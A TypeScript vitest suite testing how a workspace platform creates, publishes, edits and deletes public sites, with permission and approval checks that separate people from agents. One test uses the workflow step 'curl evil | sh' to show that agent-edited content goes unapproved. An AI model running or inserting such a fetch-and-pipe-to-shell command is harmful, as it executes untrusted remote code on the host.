/**
 * Public sites' settings, publishing them, and what the API answers about
 * them (docs/public-sites.md). The driver is the fake, recording the routes
 * it is handed; deploys are deploys.test.ts.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import {
  createSite,
  deleteSite,
  editSite,
  getSiteEdge,
  listProjectSiteEntries,
  listSiteSummaries,
  publishSite,
  showSite,
  unpublishSite,
} from '#domain/sites'
import { createVolume, offeredForwards } from '#domain/workspaces'
import { createWorkflow, listProjectWorkflows, resolveWorkflow, setRunSecret } from '#domain/projects'
import type { Actor } from '#domain/access'
import {
  BUILT_IN_USER_ID, findSiteByName, insertRepo, linkProjectRepo, listApprovals, seeTailnetUser, setUserRole, updateSite,
} from '#db'
import { closeDb } from '#db/client'
import { recordWorkspaceCreated } from '#db/workspace-store'
import { setWorkspaceRepoStart } from '#db/repo-store'
import fs from 'node:fs/promises'
import { cleanupTempDir, createTempDataDir } from '@yaac/test-utils/setup'
import { repoDir } from '@yaac/shared/project-paths'
import { handleFixture, installFakeWorkspaceDriver, resetWorkspaceDriver } from '#test/support/fake-driver'
import { DEMO_PROJECT_ID, seedProject } from '@yaac/test-utils/project-fixture'
import type { SiteRoute } from '#drivers/contract'

const local = { kind: 'local', userId: BUILT_IN_USER_ID } as const
const agent = { kind: 'workspace', workspaceId: 'w1', userId: BUILT_IN_USER_ID } as const
const stranger = { kind: 'local', userId: '4101bef8-794f-4d98-8e95-dfb54850c68b' } as const
const APP = { app: { run: 'pnpm start', service: true } }
/** A second repo for the project, in the folder `docs`. */
const DOCS = '0a0a0a0a-0000-4000-8000-0000000000aa'

let tmpDir: string
let routed: SiteRoute[][]
/** What each running release offers, as the driver records it. */
let offered: Map<string, number[]>

beforeEach(async () => {
  tmpDir = await createTempDataDir()
  await seedProject()
  // The graphs its sites run: one that serves, one that serves from the
  // volume, and one with no service.
  await createWorkflow(local, DEMO_PROJECT_ID, { name: 'app', steps: APP })
  await createWorkflow(local, DEMO_PROJECT_ID, { name: 'on-volume', steps: { app: { run: 'x', service: true, needs: ['volume'] } } })
  await createWorkflow(local, DEMO_PROJECT_ID, { name: 'build', steps: { build: { run: 'make' } } })
  routed = []
  offered = new Map([['rel-1', [3001]]])
  installFakeWorkspaceDriver({
    syncSites: (sites) => { routed.push(sites); return Promise.resolve() },
    siteCloudflareStatus: () => Promise.resolve('connected'),
    find: (id) => Promise.resolve(offered.has(id) ? handleFixture({ workspaceId: id, jobName: `yaac-${id}` }) : undefined),
    unforwardPort: ({ workspaceId }, port) => {
      offered.set(workspaceId, (offered.get(workspaceId) ?? []).filter((p) => p !== port))
      return Promise.resolve(true)
    },
    declareForwards: (workspaceId, forwards) => {
      offered.set(workspaceId, [...offered.get(workspaceId) ?? [], ...forwards.map((f) => f.containerPort)])
      return Promise.resolve(forwards.map(({ containerPort }) => ({ containerPort, hostPort: containerPort })))
    },
  })
})

afterEach(async () => {
  vi.unstubAllEnvs()
  resetWorkspaceDriver()
  await closeDb()
  await cleanupTempDir(tmpDir)
})

/** Make another user the install's admin and the project's owner a
 *  member, answering the admin. */
async function demoteOwner(): Promise<{ kind: 'tailnet'; userId: string; login: string; name: string }> {
  const userId = await seeTailnetUser('admin@example.com', 'Admin')
  await setUserRole(userId, 'admin')
  await setUserRole(BUILT_IN_USER_ID, 'member')
  return { kind: 'tailnet', userId, login: 'admin@example.com', name: 'Admin' }
}

const create = (over: Partial<Parameters<typeof createSite>[2]> = {}, actor: Actor = local): Promise<void> => createSite(actor, DEMO_PROJECT_ID, {
  name: 'shop', port: 3000, workflow: 'app', repos: [{ repo: 'demo', branch: 'main' }], ...over,
})

/** Publish a site as its owner, at `hostname`. */
const publish = (name: string, hostname: string, actor: Actor = local): Promise<void> =>
  publishSite(actor, DEMO_PROJECT_ID, name, { hostname })

/** The spec a deploy of the site with its current settings is approved
 *  for: its site, workflow, port and volume. */
async function specOf(name: string): Promise<string> {
  const row = (await findSiteByName(DEMO_PROJECT_ID, name))!
  const named = (await listProjectWorkflows(DEMO_PROJECT_ID)).find((w) => w.id === row.namedWorkflowId)!
  const workflowId = (await resolveWorkflow(DEMO_PROJECT_ID, named.name)).workflow.id
  return `${row.id}:${workflowId}:${String(row.port)}:${row.volumeId ?? ''}`
}

/** Link the second repo, `docs`, whose main clone is a copy of the
 *  first's. */
async function linkDocs(): Promise<void> {
  await fs.cp(repoDir(DEMO_PROJECT_ID), repoDir(DOCS), { recursive: true })
  await insertRepo({ id: DOCS, owner: BUILT_IN_USER_ID, remoteUrl: 'https://example.com/docs' })
  await linkProjectRepo(DEMO_PROJECT_ID, DOCS, 'docs')
}

const COMMIT = 'c'.repeat(40)

describe('createSite', () => {
  it('makes a site unpublished, with no route, refusing bad settings, a taken name and a non-owner', async () => {
    await create()
    expect(await findSiteByName(DEMO_PROJECT_ID, 'shop')).toMatchObject({ published: false })
    expect((await findSiteByName(DEMO_PROJECT_ID, 'shop'))?.hostname).toBeUndefined()
    expect(routed).toEqual([])
    await expect(create({ name: 'Bad Name' })).rejects.toMatchObject({ code: 'VALIDATION' })
    await expect(create({ name: 'a', port: 0 })).rejects.toMatchObject({ code: 'VALIDATION' })
    await expect(create({ name: 'a', adminPort: 70000 })).rejects.toMatchObject({ code: 'VALIDATION' })
    // The router serves the site's port to the internet, which the admin
    // port must never be.
    await expect(create({ name: 'a', adminPort: 3000 })).rejects.toMatchObject({ code: 'VALIDATION' })
    await expect(create({ name: 'a', workflow: 'build' }))
      .rejects.toMatchObject({ code: 'VALIDATION', message: expect.stringContaining('service') as unknown })
    // Only a site with a volume may wait on it.
    await expect(create({ name: 'a', workflow: 'on-volume' })).rejects.toMatchObject({ code: 'VALIDATION' })
    await expect(create({ name: 'a', volume: 'missing' })).rejects.toMatchObject({ code: 'NOT_FOUND' })
    // Each repo names a branch on origin or a full commit, and none falls
    // back to a default.
    for (const repos of [[], [{ repo: 'demo' }], [{ repo: 'demo', branch: 'main..x' }], [{ repo: 'demo', commit: 'abc' }],
      [{ repo: 'demo', branch: 'main', commit: COMMIT }], [{ repo: 'demo', branch: 'main' }, { repo: 'demo', commit: COMMIT }]]) {
      await expect(create({ name: 'a', repos }), JSON.stringify(repos)).rejects.toMatchObject({ code: 'VALIDATION' })
    }
    await expect(create({ name: 'a', repos: [{ repo: 'nope', branch: 'main' }] })).rejects.toMatchObject({ code: 'NOT_FOUND' })
    await expect(create()).rejects.toMatchObject({ code: 'CONFLICT' })
    await expect(createSite(stranger, DEMO_PROJECT_ID, { name: 'x', port: 1, workflow: 'app', repos: [] }))
      .rejects.toMatchObject({ code: 'FORBIDDEN' })

    // One volume holds one site's data.
    await createVolume(local, DEMO_PROJECT_ID, 'data')
    await create({ name: 'v1', volume: 'data' })
    await expect(create({ name: 'v2', volume: 'data' })).rejects.toMatchObject({ code: 'CONFLICT' })

    // Building a site is the owner's, admin or not, and the owner's agents'.
    await create({ name: 'staged' }, agent)
    await demoteOwner()
    await create({ name: 'mine' })
    expect(routed).toEqual([])
  })

  it('starts releases with several repos, which must include its workflow\'s, a person\'s follow approving what it names', async () => {
    await linkDocs()
    await setRunSecret(local, DEMO_PROJECT_ID, { name: 'P8_KEY', value: 'pem' })
    await createWorkflow(local, DEMO_PROJECT_ID, { name: 'keyed', steps: APP, secrets: ['P8_KEY'], repos: ['docs'] })
    // Its repos must include every one its workflow names.
    await expect(create({ workflow: 'keyed' })).rejects.toMatchObject({ code: 'VALIDATION', message: expect.stringContaining('runs in docs') as unknown })
    // A following site of two repos, one at a branch and one at a commit:
    // setting it approves both for the site's spec, not the workflow's.
    await create({ workflow: 'keyed', follow: true, repos: [{ repo: 'demo', branch: 'dev' }, { repo: 'docs', commit: COMMIT }] })
    expect(await findSiteByName(DEMO_PROJECT_ID, 'shop')).toMatchObject({
      follow: true, repos: [{ repo: DEMO_PROJECT_ID, branch: 'dev' }, { repo: DOCS, commit: COMMIT }],
    })
    expect((await listApprovals(await specOf('shop'))).sort()).toEqual([`${DEMO_PROJECT_ID}:refs/heads/dev`, COMMIT].sort())
    expect((await listProjectWorkflows(DEMO_PROJECT_ID)).find((w) => w.name === 'keyed')).toMatchObject({ approvedBranches: [], approvedCommits: [] })
    expect((await listProjectSiteEntries(DEMO_PROJECT_ID))[0]).toMatchObject({
      follow: true, repos: [{ dir: 'demo', branch: 'dev' }, { dir: 'docs', commit: COMMIT }],
    })
    // An agent's follow approves nothing.
    await create({ name: 'agents', workflow: 'keyed', follow: true, repos: [{ repo: 'demo', branch: 'dev' }, { repo: 'docs', commit: COMMIT }] }, agent)
    expect(await listApprovals(await specOf('agents'))).toEqual([])
  })
})

describe('publishSite', () => {
  it('routes a site at a hostname, an admin\'s alone, refusing a bad or taken name', async () => {
    await create()
    await create({ name: 'blog' })
    await expect(publish('shop', 'shop.example.com', agent)).rejects.toMatchObject({ code: 'FORBIDDEN' })
    await expect(publish('shop', 'shop.example.com', stranger)).rejects.toMatchObject({ code: 'FORBIDDEN' })
    await publish('shop', 'shop.example.com')
    const row = (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
    expect(row).toMatchObject({ published: true, hostname: 'shop.example.com' })
    expect(routed.at(-1)).toEqual([{ siteId: row.id, hostname: 'shop.example.com', edge: 'public', port: 3000 }])
    // A domain's apex is a hostname too, lowercased, and any domain is
    // taken, since the tunnel decides what is public.
    await publish('blog', ' Blog.Elsewhere.ORG ')
    expect(routed.at(-1)?.map((r) => r.hostname).sort()).toEqual(['blog.elsewhere.org', 'shop.example.com'])
    for (const bad of ['https://a.example.com', 'nope']) {
      await expect(publish('blog', bad), bad).rejects.toMatchObject({ code: 'VALIDATION' })
    }
    await expect(publish('blog', 'shop.example.com')).rejects.toMatchObject({ code: 'CONFLICT', message: expect.stringContaining('shop.example.com') as unknown })
    // Publishing again moves it.
    await publish('shop', 'www.example.com')
    expect(routed.at(-1)?.map((r) => r.hostname).sort()).toEqual(['blog.elsewhere.org', 'www.example.com'])
    await expect(publish('none', 'x.example.com')).rejects.toMatchObject({ code: 'NOT_FOUND' })

    // It takes an admin, even on the caller's own project.
    await demoteOwner()
    await expect(publish('blog', 'mine.example.com')).rejects.toMatchObject({ code: 'FORBIDDEN', message: expect.stringContaining('publish sites') as unknown })
  })

  it('goes live with the release previewed, approving it and what a following site follows', async () => {
    await create({ follow: true, repos: [{ repo: 'demo', branch: 'dev' }] })
    const row = (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
    const spec = await specOf('shop')
    await updateSite(row.id, { liveWorkspaceId: 'rel-1', liveSince: new Date(), livePort: 3000, releaseCommits: { [DEMO_PROJECT_ID]: COMMIT } })
    await recordWorkspaceCreated({ projectId: DEMO_PROJECT_ID, workspaceId: 'rel-1', siteId: row.id })
    // A release other than the one serving is refused, publishing nothing.
    await expect(publishSite(local, DEMO_PROJECT_ID, 'shop', { hostname: 'shop.example.com', release: 'rel-2' }))
      .rejects.toMatchObject({ code: 'CONFLICT', message: expect.stringContaining('rel-1') as unknown })
    expect((await findSiteByName(DEMO_PROJECT_ID, 'shop'))?.published).toBe(false)
    await publishSite(local, DEMO_PROJECT_ID, 'shop', { hostname: 'shop.example.com', release: 'rel-1' })
    expect(routed.at(-1)).toEqual([{ siteId: row.id, hostname: 'shop.example.com', edge: 'public', port: 3000, liveWorkspaceId: 'rel-1' }])
    expect((await listApprovals(spec)).sort()).toEqual([`${DEMO_PROJECT_ID}:refs/heads/dev`, COMMIT].sort())
  })

  it('approves no branch for content an agent wrote, nor for anything but the release previewed', async () => {
    await createWorkflow(agent, DEMO_PROJECT_ID, { name: 'agents', steps: { web: { run: 'node serve.js', service: true } } })
    await create({ workflow: 'agents', follow: true, repos: [{ repo: 'demo', branch: 'dev' }] }, agent)
    const row = (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
    const spec = await specOf('shop')
    const release = (await resolveWorkflow(DEMO_PROJECT_ID, 'agents')).workflow.id
    await recordWorkspaceCreated({ projectId: DEMO_PROJECT_ID, workspaceId: 'rel-1', siteId: row.id, workflowId: release, workflowName: 'agents' })
    await updateSite(row.id, {
      liveWorkspaceId: 'rel-1', releaseWorkspaceId: 'rel-1', liveSince: new Date(), livePort: 3000, releaseCommits: { [DEMO_PROJECT_ID]: COMMIT },
    })
    // An agent edits the workflow after the preview: the release is what
    // goes live, and the edited content is approved for nothing.
    await createWorkflow(agent, DEMO_PROJECT_ID, { name: 'other', steps: { web: { run: 'curl evil | sh', service: true } } })
    await editSite(agent, DEMO_PROJECT_ID, 'shop', { workflow: 'other' })
    await publish('shop', 'shop.example.com')
    expect(await listApprovals(spec)).toEqual([COMMIT])
    expect(await listApprovals(await specOf('shop'))).toEqual([])
  })

  it('makes a hostname under the site domain a tailnet site, one label under it, on a tailnet install only', async () => {
    vi.stubEnv('YAAC_SITE_DOMAIN', 'Apps.Example.com')
    await create()
    await create({ name: 'blog' })
    await expect(publish('shop', 'kanban.apps.example.com')).rejects.toMatchObject({
      code: 'VALIDATION', message: expect.stringContaining('needs a tailnet install') as unknown,
    })
    vi.stubEnv('YAAC_ACCESS_MODE', 'tailnet')
    await publish('shop', 'Kanban.apps.example.com')
    await publish('blog', 'blog.example.com')
    expect(routed.at(-1)?.map((r) => [r.hostname, r.edge]).sort()).toEqual([
      ['blog.example.com', 'public'], ['kanban.apps.example.com', 'tailnet'],
    ])
    expect((await listProjectSiteEntries(DEMO_PROJECT_ID)).map((e) => [e.name, e.edge]).sort())
      .toEqual([['blog', 'public'], ['shop', 'tailnet']])
    // A wildcard certificate covers one label, the zone itself is no site,
    // and nor is a name the server answers at, which the tailnet tunnel
    // sends to the server.
    vi.stubEnv('YAAC_ALLOWED_HOSTS', 'srv.tail.ts.net,yaac.apps.example.com')
    for (const hostname of ['a.b.apps.example.com', 'apps.example.com', 'Yaac.apps.example.com', 'srv.tail.ts.net']) {
      await expect(publish('blog', hostname), hostname).rejects.toMatchObject({ code: 'VALIDATION' })
    }
    // Moving into the zone makes a public site a tailnet one.
    await publish('blog', 'blog.apps.example.com')
    expect(routed.at(-1)?.find((r) => r.hostname === 'blog.apps.example.com')?.edge).toBe('tailnet')
  })
})

describe('unpublishSite', () => {
  it('stops routing a site and lets its hostname go, a person\'s alone, any admin\'s too', async () => {
    await create()
    await create({ name: 'blog' })
    await publish('shop', 'shop.example.com')
    await publish('blog', 'blog.example.com')
    await expect(unpublishSite(agent, DEMO_PROJECT_ID, 'shop')).rejects.toMatchObject({ code: 'FORBIDDEN' })
    await expect(unpublishSite(stranger, DEMO_PROJECT_ID, 'shop')).rejects.toMatchObject({ code: 'FORBIDDEN' })
    await unpublishSite(local, DEMO_PROJECT_ID, 'shop')
    const row = (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
    expect(row.published).toBe(false)
    expect(row.hostname).toBeUndefined()
    expect(routed.at(-1)?.map((r) => r.hostname)).toEqual(['blog.example.com'])
    // Its hostname is free for another site.
    await publish('blog', 'shop.example.com')
    const admin = await demoteOwner()
    await unpublishSite(admin, DEMO_PROJECT_ID, 'blog')
    expect(routed.at(-1)).toEqual([])
  })
})

describe('editSite', () => {
  it('moves the admin port at once and keeps the rest for the next deploy, refusing during a deploy', async () => {
    await createVolume(local, DEMO_PROJECT_ID, 'data')
    await create({ adminPort: 3001, volume: 'data', workflow: 'on-volume' })
    const row = (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
    await updateSite(row.id, { liveWorkspaceId: 'rel-1', livePort: 3000 })

    await editSite(local, DEMO_PROJECT_ID, 'shop', { port: 4000, adminPort: 4001, deployTimeoutMinutes: 90 })
    expect(await findSiteByName(DEMO_PROJECT_ID, 'shop')).toMatchObject({ port: 4000, adminPort: 4001, deployTimeoutMinutes: 90 })
    // The live release offers the new admin port in place of the old, as a
    // server restart would; a release offers the ports its site serves on
    // too, for its owner's preview.
    expect(offered.get('rel-1')).toEqual([4001])
    expect((await offeredForwards([], row.id)).map((f) => f.containerPort).sort()).toEqual([3000, 4000, 4001])

    // Equal to the port the internet reaches, whichever side moves.
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { adminPort: 4000 })).rejects.toMatchObject({ code: 'VALIDATION' })
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { port: 4001 })).rejects.toMatchObject({ code: 'VALIDATION' })
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { adminPort: 0 })).rejects.toMatchObject({ code: 'VALIDATION' })
    expect(offered.get('rel-1')).toEqual([4001])

    // Removing it closes it on the live release at once.
    await editSite(local, DEMO_PROJECT_ID, 'shop', { adminPort: null })
    expect((await findSiteByName(DEMO_PROJECT_ID, 'shop'))?.adminPort).toBeUndefined()
    expect(offered.get('rel-1')).toEqual([])
    expect((await offeredForwards([], row.id)).map((f) => f.containerPort).sort()).toEqual([3000, 4000])

    // Its workflow needs the volume, so the volume cannot go without a
    // workflow that does not.
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { volume: null })).rejects.toMatchObject({ code: 'VALIDATION' })
    await editSite(local, DEMO_PROJECT_ID, 'shop', { volume: null, workflow: 'app' })
    expect((await findSiteByName(DEMO_PROJECT_ID, 'shop'))?.volumeId).toBeUndefined()

    // A branch is one on origin, by its own name: a ref-like name would
    // deploy a branch anyone who may push could create.
    await editSite(agent, DEMO_PROJECT_ID, 'shop', { repos: [{ repo: 'demo', branch: 'dev' }], follow: true })
    expect((await listProjectSiteEntries(DEMO_PROJECT_ID))[0]).toMatchObject({ follow: true, repos: [{ dir: 'demo', branch: 'dev' }] })
    for (const branch of ['HEAD', 'origin/main', 'refs/heads/main', 'agent/x', 'missing']) {
      await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { repos: [{ repo: 'demo', branch }] }), branch).rejects.toMatchObject({ code: 'VALIDATION' })
    }

    // It moves to another named workflow, checked as a release's graph.
    await createWorkflow(local, DEMO_PROJECT_ID, { name: 'web', steps: { web: { run: 'pnpm serve', service: true } } })
    await editSite(local, DEMO_PROJECT_ID, 'shop', { workflow: 'web' })
    expect((await listProjectSiteEntries(DEMO_PROJECT_ID))[0]).toMatchObject({ workflow: 'web', steps: { web: { run: ['pnpm serve'], service: true } } })
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { workflow: 'build' })).rejects.toMatchObject({ code: 'VALIDATION' })
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { workflow: 'nope' })).rejects.toMatchObject({ code: 'NOT_FOUND' })

    // Its repos are its whole list, and must keep its workflow's.
    await linkDocs()
    await createWorkflow(local, DEMO_PROJECT_ID, { name: 'docs-app', steps: APP, repos: ['docs'] })
    await editSite(local, DEMO_PROJECT_ID, 'shop', { workflow: 'docs-app', repos: [{ repo: 'docs', branch: 'main' }, { repo: 'demo', branch: 'dev' }] })
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { repos: [{ repo: 'demo', branch: 'dev' }] })).rejects.toMatchObject({ code: 'VALIDATION' })

    await updateSite(row.id, { deployWorkspaceId: 'rel-2' })
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { port: 5000 })).rejects.toMatchObject({ code: 'CONFLICT' })
    await expect(editSite(stranger, DEMO_PROJECT_ID, 'shop', { port: 5000 })).rejects.toMatchObject({ code: 'FORBIDDEN' })
    await expect(editSite(local, DEMO_PROJECT_ID, 'none', { port: 5000 })).rejects.toMatchObject({ code: 'NOT_FOUND' })

    // Following a published site pauses while its owner is not an admin,
    // saying so; and stopping it publishes nothing, so any admin may,
    // mid-deploy too.
    await expect(editSite(stranger, DEMO_PROJECT_ID, 'shop', { follow: false })).rejects.toMatchObject({ code: 'FORBIDDEN' })
    await updateSite(row.id, { published: true, hostname: 'shop.example.com' })
    const admin = await demoteOwner()
    expect((await listProjectSiteEntries(DEMO_PROJECT_ID))[0]?.followPaused).toBe('its owner is not an admin')
    await editSite(admin, DEMO_PROJECT_ID, 'shop', { follow: false })
    expect((await findSiteByName(DEMO_PROJECT_ID, 'shop'))?.follow).toBe(false)
  })

  it('leaves a published site\'s settings to a person who is an admin, so its volume cannot be taken off it', async () => {
    await createVolume(local, DEMO_PROJECT_ID, 'data')
    await create({ volume: 'data', workflow: 'on-volume' })
    await editSite(agent, DEMO_PROJECT_ID, 'shop', { port: 4000 })
    await publish('shop', 'shop.example.com')
    for (const patch of [{ volume: null, workflow: 'app' }, { port: 4001 }, { follow: true }, { repos: [{ repo: 'demo', branch: 'dev' }] }]) {
      await expect(editSite(agent, DEMO_PROJECT_ID, 'shop', patch), JSON.stringify(patch)).rejects.toMatchObject({ code: 'FORBIDDEN' })
    }
    expect((await findSiteByName(DEMO_PROJECT_ID, 'shop'))?.volumeId).toBeDefined()
    // Nor may an agent put a site of its own on the volume.
    await expect(create({ name: 'mine', volume: 'data', workflow: 'on-volume' }, agent)).rejects.toMatchObject({ code: 'CONFLICT' })
    await editSite(local, DEMO_PROJECT_ID, 'shop', { port: 4001 })
    await demoteOwner()
    await expect(editSite(local, DEMO_PROJECT_ID, 'shop', { port: 4002 }))
      .rejects.toMatchObject({ code: 'FORBIDDEN', message: expect.stringContaining('publish sites') as unknown })
  })

  it('approves what a following site names for its new spec when a person changes it, and nothing for an agent', async () => {
    await linkDocs()
    await setRunSecret(local, DEMO_PROJECT_ID, { name: 'P8_KEY', value: 'pem' })
    await createWorkflow(local, DEMO_PROJECT_ID, { name: 'keyed', steps: APP, secrets: ['P8_KEY'] })
    await create({ workflow: 'keyed' })
    await editSite(local, DEMO_PROJECT_ID, 'shop', { adminPort: 3001 })
    expect(await listApprovals(await specOf('shop'))).toEqual([])
    await editSite(local, DEMO_PROJECT_ID, 'shop', { follow: true })
    expect(await listApprovals(await specOf('shop'))).toEqual([`${DEMO_PROJECT_ID}:refs/heads/main`])
    await editSite(local, DEMO_PROJECT_ID, 'shop', { repos: [{ repo: 'demo', branch: 'main' }, { repo: 'docs', commit: COMMIT }] })
    expect((await listApprovals(await specOf('shop'))).sort()).toEqual([`${DEMO_PROJECT_ID}:refs/heads/main`, COMMIT].sort())
    // A new port is a new spec, which an agent's edit leaves unapproved.
    await editSite(agent, DEMO_PROJECT_ID, 'shop', { port: 4000 })
    expect(await listApprovals(await specOf('shop'))).toEqual([])
  })
})

describe('deleteSite', () => {
  it('drops the site and its route', async () => {
    await create()
    await create({ name: 'blog' })
    await publish('shop', 'shop.example.com')
    await publish('blog', 'blog.example.com')
    await expect(deleteSite(stranger, DEMO_PROJECT_ID, 'shop')).rejects.toMatchObject({ code: 'FORBIDDEN' })
    await deleteSite(local, DEMO_PROJECT_ID, 'shop')
    expect(await findSiteByName(DEMO_PROJECT_ID, 'shop')).toBeUndefined()
    expect(routed.at(-1)?.map((r) => r.hostname)).toEqual(['blog.example.com'])
  })

  it('lets an agent delete an unpublished site only, and any admin take one down, and its owner once demoted', async () => {
    await create()
    await create({ name: 'blog' })
    await create({ name: 'staged' })
    await publish('shop', 'shop.example.com')
    await publish('blog', 'blog.example.com')
    await expect(deleteSite(agent, DEMO_PROJECT_ID, 'shop')).rejects.toMatchObject({ code: 'FORBIDDEN' })
    await deleteSite(agent, DEMO_PROJECT_ID, 'staged')
    const admin = await demoteOwner()
    await deleteSite(admin, DEMO_PROJECT_ID, 'shop')
    await deleteSite(local, DEMO_PROJECT_ID, 'blog')
    expect(routed.at(-1)).toEqual([])
  })
})

describe('listProjectSiteEntries', () => {
  it('answers each site with its live release, the deploy under way and one awaiting approval', async () => {
    await createVolume(local, DEMO_PROJECT_ID, 'data')
    await create({ volume: 'data', adminPort: 3001 })
    await create({ name: 'staged' })
    await publish('shop', 'shop.example.com')
    await recordWorkspaceCreated({ projectId: DEMO_PROJECT_ID, workspaceId: 'rel-1' })
    const row = (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
    const since = new Date('2026-11-03T10:00:00Z')
    await updateSite(row.id, {
      liveWorkspaceId: 'rel-1', liveSince: since, releaseCommits: { [DEMO_PROJECT_ID]: 'a'.repeat(40) },
      deployWorkspaceId: 'rel-2', deployCommits: { [DEMO_PROJECT_ID]: 'b'.repeat(40) }, deployStartedAt: since, deployPhase: 'building', deployReplacing: true,
      requestedCommits: { [DEMO_PROJECT_ID]: COMMIT }, requestedAt: since, requestedBy: 'w1',
      requestedWorkflowId: (await resolveWorkflow(DEMO_PROJECT_ID, 'app')).workflow.id,
    })
    const [shop, staged] = await listProjectSiteEntries(DEMO_PROJECT_ID)
    expect(staged).toMatchObject({ name: 'staged', published: false })
    expect(staged.hostname).toBeUndefined()
    expect(staged.edge).toBeUndefined()
    expect([shop]).toEqual([expect.objectContaining({
      name: 'shop',
      published: true,
      hostname: 'shop.example.com',
      edge: 'public',
      adminPort: 3001,
      volume: 'data',
      repos: [{ dir: 'demo', branch: 'main' }],
      follow: false,
      live: { workspaceId: 'rel-1', commits: [{ dir: '', commit: 'a'.repeat(40) }], since: since.toISOString(), running: true },
      deploy: { workspaceId: 'rel-2', commits: [{ dir: '', commit: 'b'.repeat(40) }], startedAt: since.toISOString(), phase: 'building', replacing: true },
      requested: {
        workflowId: (await resolveWorkflow(DEMO_PROJECT_ID, 'app')).workflow.id, steps: { app: { run: ['pnpm start'], service: true } },
        // The live release here records no workflow or volume, so the
        // request changes both.
        secrets: [], commits: [{ dir: '', commit: COMMIT }], at: since.toISOString(), from: 'agent', workspaceId: 'w1',
        changes: ['workflow', 'volume'],
      },
    })])
  })
})

describe('listSiteSummaries', () => {
  it('answers every site\'s state from its row alone, with its workflow\'s name', async () => {
    await create()
    const row = (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
    const since = new Date('2026-11-03T10:00:00Z')
    await updateSite(row.id, { deployWorkspaceId: 'rel-2', deployCommits: { [DEMO_PROJECT_ID]: 'b'.repeat(40) }, deployStartedAt: since })
    expect(await listSiteSummaries()).toEqual([{
      id: row.id, projectId: DEMO_PROJECT_ID, name: 'shop', published: false, workflow: 'app', follow: false,
      deploy: { workspaceId: 'rel-2', commits: [{ dir: '', commit: 'b'.repeat(40) }], startedAt: since.toISOString(), phase: 'launching' },
    }])
  })
})

describe('showSite', () => {
  it('lists the site\'s releases, newest first, each with its commits per repo', async () => {
    await create()
    const row = (await findSiteByName(DEMO_PROJECT_ID, 'shop'))!
    await recordWorkspaceCreated({ projectId: DEMO_PROJECT_ID, workspaceId: 'rel-1', siteId: row.id, repos: [{ repoId: DEMO_PROJECT_ID, path: '' }] })
    await new Promise((r) => setTimeout(r, 5))
    await recordWorkspaceCreated({
      projectId: DEMO_PROJECT_ID, workspaceId: 'rel-2', siteId: row.id, rerunOf: 'rel-1',
      repos: [{ repoId: DEMO_PROJECT_ID, path: 'demo' }, { repoId: DOCS, path: 'docs' }],
    })
    for (const [id, repo, commit] of [['rel-1', DEMO_PROJECT_ID, 'a'], ['rel-2', DEMO_PROJECT_ID, 'b'], ['rel-2', DOCS, 'c']]) {
      await setWorkspaceRepoStart(id, repo, { startCommit: commit.repeat(40) })
    }
    await recordWorkspaceCreated({ projectId: DEMO_PROJECT_ID, workspaceId: 'dev' })
    const detail = await showSite(DEMO_PROJECT_ID, 'shop')
    expect(detail.releases.map((r) => [r.workspaceId, r.rerunOf, r.commits])).toEqual([
      ['rel-2', 'rel-1', [{ dir: 'demo', commit: 'b'.repeat(40) }, { dir: 'docs', commit: 'c'.repeat(40) }]],
      ['rel-1', undefined, [{ dir: '', commit: 'a'.repeat(40) }]],
    ])
    await expect(showSite(DEMO_PROJECT_ID, 'none')).rejects.toMatchObject({ code: 'NOT_FOUND' })
  })
})

describe('getSiteEdge', () => {
  it('answers both tunnels\' state and the site domain', async () => {
    expect(await getSiteEdge()).toEqual({ cloudflare: 'connected', tailnet: 'absent' })
    vi.stubEnv('YAAC_SITE_DOMAIN', 'apps.example.com')
    expect(await getSiteEdge()).toEqual({ cloudflare: 'connected', tailnet: 'absent', siteDomain: 'apps.example.com' })
  })
})
